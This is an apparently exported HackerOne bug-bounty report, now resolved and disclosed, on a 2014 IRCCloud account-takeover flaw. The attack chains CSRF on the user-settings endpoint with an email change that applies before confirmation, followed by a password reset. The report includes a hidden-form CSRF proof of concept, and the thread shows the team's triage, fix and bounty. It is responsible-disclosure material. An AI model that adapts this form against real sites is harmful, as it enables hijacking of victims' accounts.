{"id":6910,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTEw","url":"https://hackerone.com/reports/6910","title":"Full account takeover using CSRF and password reset","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-04-10T23:05:03.401Z","submitted_at":"2014-04-10T23:05:03.401Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"melvin","url":"/melvin","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/009/c0969978fdebf48b6c49fa8f91a8c60b2cd8e71d_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":140,"url":"https://hackerone.com/irccloud","handle":"irccloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"IRCCloud","twitter_handle":"irccloud","website":"https://www.irccloud.com","about":"Group chat for teams, friends, and communities. IRCCloud is an IRC client with a future. Stay connected, chat from anywhere, and never miss a message."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2014-04-14T13:43:11.749Z","bug_reporter_agreed_on_going_public_at":"2014-04-12T16:00:44.821Z","team_member_agreed_on_going_public_at":"2014-04-14T13:43:11.546Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"An attacker could take over any user account by doing the following things.\r\n\r\n1) Exploit a CSRF vulnerability in `/chat/user-settings`.  An attacker creates a webpage on a (non-IRCCloud) website (for example: http://example.com/cat.html) and inserts a (hidden) form like this:\r\n\r\n    \u003cform action=\"https://www.irccloud.com/chat/user-settings\" method=\"post\"\u003e\r\n    \u003cinput type=\"hidden\" name=\"email\" value=\"hacker@example.com\"\u003e\r\n    \u003cinput type=\"hidden\" name=\"realname\" value=\"Doesn't Matter\"\u003e\r\n    \u003cinput type=\"hidden\" name=\"hwords\" value=\"\"\u003e\r\n    \u003cinput type=\"hidden\" name=\"autoaway\" value=\"1\"\u003e\r\n    \u003cinput type=\"hidden\" name=\"reqid\" value=\"1\"\u003e\r\n    \u003cinput type=\"hidden\" name=\"session\" value=\"\"\u003e\r\n    \u003cinput type=\"submit\"\u003e \r\n    \u003c!-- some code to make the form submit automatically, in the  background--\u003e\r\n    \u003c/form\u003e\r\n\r\n2) The attacker will send a link to the page to the victim. When the victim is logged in to IRCCloud, and clicks the link to the page, the e-mail of the victim on IRCCloud will be updated (in the background) to `hacker@example.com`.\r\n\r\n3) The attacker will receive an e-mail to confirm the e-mail address (see: mail.png).\r\n\r\n4) The attacker can now use the password reset functionality to change the password of the victim's account and gain full control over the account.","vulnerability_information_html":"\u003cp\u003eAn attacker could take over any user account by doing the following things.\u003c/p\u003e\n\n\u003cp\u003e1) Exploit a CSRF vulnerability in \u003ccode\u003e/chat/user-settings\u003c/code\u003e.  An attacker creates a webpage on a (non-IRCCloud) website (for example: \u003ca title=\"http://example.com/cat.html\" href=\"/redirect?url=http%3A%2F%2Fexample.com%2Fcat.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://example.com/cat.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) and inserts a (hidden) form like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;form action=\u0026quot;https://www.irccloud.com/chat/user-settings\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;email\u0026quot; value=\u0026quot;hacker@example.com\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;realname\u0026quot; value=\u0026quot;Doesn\u0026#39;t Matter\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;hwords\u0026quot; value=\u0026quot;\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;autoaway\u0026quot; value=\u0026quot;1\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;reqid\u0026quot; value=\u0026quot;1\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;session\u0026quot; value=\u0026quot;\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;submit\u0026quot;\u0026gt; \n\u0026lt;!-- some code to make the form submit automatically, in the  background--\u0026gt;\n\u0026lt;/form\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e2) The attacker will send a link to the page to the victim. When the victim is logged in to IRCCloud, and clicks the link to the page, the e-mail of the victim on IRCCloud will be updated (in the background) to \u003ccode\u003ehacker@example.com\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e3) The attacker will receive an e-mail to confirm the e-mail address (see: mail.png).\u003c/p\u003e\n\n\u003cp\u003e4) The attacker can now use the password reset functionality to change the password of the victim\u0026#39;s account and gain full control over the account.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-05-12T15:51:47.441Z","allow_singular_disclosure_after":-209314012.2919834,"singular_disclosure_allowed":true,"vote_count":3,"voters":["arifmkhls","cryptographer","hdarji"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":28249,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's the image.","markdown_message":"\u003cp\u003eHere\u0026#39;s the image.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-10T23:06:09.204Z","updated_at":"2014-04-10T23:06:09.204Z","actor":{"username":"melvin","cleared":false,"url":"/melvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/009/c0969978fdebf48b6c49fa8f91a8c60b2cd8e71d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":6148,"filename":"mail.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/006/148/19215764dcee88987417c1447b41fa8544fe442c/mail.png?response-content-disposition=attachment%3B%20filename%3D%22mail.png%22%3B%20filename%2A%3DUTF-8%27%27mail.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVBWWKZ4H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063839Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCmEbZvVQ%2FI1GHRJjrhZK2Y6zh4lCWK725%2FwOpNu%2BnZkAIhAIZlqGHog%2B4PZMdnvhSU5APZbycPDz1wpNXbi5uE94ueKrQDCFUQARoMMDEzNjE5Mjc0ODQ5IgxU5AAHhqo1cPAzbTcqkQOGB5pEHXl6QCBCTSHUmyd%2FF8M3rpTqzp%2BOigrWU%2BrXYHZYm%2BGDawsiXhnqeD9o8Qw0b%2Fr0efVbRmhj5baoPrxgSiY%2B9zsreR3qClZZKnS0%2Brs8OqiMGd3clBbyfOxw2fa2vgQglV4dLF6EXSiGfxOms8eWdw%2F8mPtc81dMxDIlxTs50KUnd6aUjgG5BJs2k%2FL0rOKXYBS%2FdVqIQdN8JcCKMvqDv0u7pvSGEecQXa7pGdf07ufO02E64eU0OnaTeNyoq7WlZzT%2FGyvHjVtIvbXdPW15pwZm2Q4u8%2FW7ksSv4%2BxsESWLLCop0OeGUhtIppCDQlaMPC9JTj0HYKbMEGmZagmLfgHX4DKRg75%2FLNQViGcE%2FRCCaMxd6wrsv0dlz4dekjWvp4mXzLFkuKBM6c%2F%2BAemkmkgOJKnp%2FJUV1zJTe%2BO14GyIigsvxJqvrnKvkmsUrYwar1bX%2Be7UkqGzVbMAlsbRDNIOok7bVRXerhpXnbqFQsLWlqe%2BNfa4gSSfmgu4iIjCRRMdTWsvy2NQHfTsGjDAzar%2FBTrqAcniMm3eG7%2BxDZb9XVqMyQiSNyiuBD8pwO78bO8T3Uu8vSI3S05C6UCutmNkOnjR9D2NZaOgbFO4YujbW%2FY0mhhdjSppvg%2Bzdgu0AfZOou0DDwqm4vwEc0ekiNYUD6KHvD5tZwOaalihV5dSfbzoDyvfsJI6x7RYpBZmwPcshKw3Csz0uZew1JqrbUJVmc9v6q0aXols8bxyDKKPfp6siyzKhHELgTS3XGskds%2BWx5FaWemc%2Bo8QqyIuoOtWjmUwF39ydFOfg%2FyeKdwBxELGLKCSN8MyV6ov7IBrib4UiM%2F6l36ymDoHIX8ohg%3D%3D\u0026X-Amz-Signature=b07798dfad9ca3e7aa48b2e13dca43448d358fcb91151c4a67ab4ce1359a92bd"}],"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":28540,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I should add that there are two bugs to fix:\n1)  The CSRF vulnerability\n2)  The e-mail is changed **before** confirmation","markdown_message":"\u003cp\u003eI should add that there are two bugs to fix:\u003cbr\u003e\n1)  The CSRF vulnerability\u003cbr\u003e\n2)  The e-mail is changed \u003cstrong\u003ebefore\u003c/strong\u003e confirmation\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-11T08:37:32.412Z","updated_at":"2014-04-11T08:37:32.412Z","actor":{"username":"melvin","cleared":false,"url":"/melvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/009/c0969978fdebf48b6c49fa8f91a8c60b2cd8e71d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":29343,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please let me know if you need any help resolving this issue. I believe the impact is quite high, because a 'bad guy' can send the link in one of the IRCCloud channels and compromise dozens of accounts at once, or easily target someone of the IRCCloud staff.","markdown_message":"\u003cp\u003ePlease let me know if you need any help resolving this issue. I believe the impact is quite high, because a \u0026#39;bad guy\u0026#39; can send the link in one of the IRCCloud channels and compromise dozens of accounts at once, or easily target someone of the IRCCloud staff.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-12T13:55:55.197Z","updated_at":"2014-04-12T13:56:38.027Z","actor":{"username":"melvin","cleared":false,"url":"/melvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/009/c0969978fdebf48b6c49fa8f91a8c60b2cd8e71d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":29346,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for reporting, we're aware of this issue and we'll be back in touch soon.","markdown_message":"\u003cp\u003eThanks for reporting, we\u0026#39;re aware of this issue and we\u0026#39;ll be back in touch soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-12T14:01:01.564Z","updated_at":"2014-04-12T14:01:01.564Z","actor":{"username":"russss","cleared":false,"url":"/russss","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/786/b539136875027662b8b5aefbacce2c7d8ab11837_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":29385,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks, we have now fixed this bug.","markdown_message":"\u003cp\u003eThanks, we have now fixed this bug.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-12T15:51:47.585Z","updated_at":"2014-04-12T15:51:47.585Z","actor":{"username":"russss","cleared":false,"url":"/russss","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/786/b539136875027662b8b5aefbacce2c7d8ab11837_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"melvin","url":"/melvin"},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":29387,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2014-04-12T15:51:56.505Z","updated_at":"2014-04-12T15:51:56.505Z","actor":{"url":"/irccloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"IRCCloud"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"irccloud","collaborator":{"username":"melvin","url":"/melvin"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":29400,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Looks good! Thank you.","markdown_message":"\u003cp\u003eLooks good! Thank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-12T16:00:44.835Z","updated_at":"2014-04-12T16:00:44.835Z","first_to_agree":true,"actor":{"username":"melvin","cleared":false,"url":"/melvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/009/c0969978fdebf48b6c49fa8f91a8c60b2cd8e71d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":30047,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-04-14T13:43:11.563Z","updated_at":"2014-04-14T13:43:11.563Z","actor":{"username":"jwheare","cleared":false,"url":"/jwheare","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/778/b500b506bad385a82e5e0da28a0214d263822656_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":30048,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-04-14T13:43:11.773Z","updated_at":"2014-04-14T13:43:11.773Z","actor":{"username":"jwheare","cleared":false,"url":"/jwheare","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/778/b500b506bad385a82e5e0da28a0214d263822656_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":30058,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For the public record, this was an issue only affecting forms that didn't involve an IRC connection cid.","markdown_message":"\u003cp\u003eFor the public record, this was an issue only affecting forms that didn\u0026#39;t involve an IRC connection cid.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-14T13:49:06.315Z","updated_at":"2014-04-14T13:49:06.315Z","actor":{"username":"jwheare","cleared":false,"url":"/jwheare","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/778/b500b506bad385a82e5e0da28a0214d263822656_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"irccloud","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}